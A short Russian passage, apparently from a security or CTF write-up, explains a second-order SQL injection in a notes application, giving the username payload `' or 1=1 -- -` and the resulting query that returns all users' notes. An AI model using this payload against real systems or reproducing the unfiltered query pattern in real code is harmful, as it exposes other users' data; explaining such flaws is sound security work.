В процессе загрузки заметок из базы данных для текущего пользователя фильтрация ввода не осуществляется, что делает SQL-инъекцию второго порядка возможной: если нарушитель заранее зарегистрирует имя пользователя `' or 1=1 -- -`, то вышеобозначенный сегмент кода сделает запрос к БД вида `SELECT id, title, note, created_at FROM posts WHERE username = '' or 1=1 -- -'`, что и будет являться классической инъекцией.
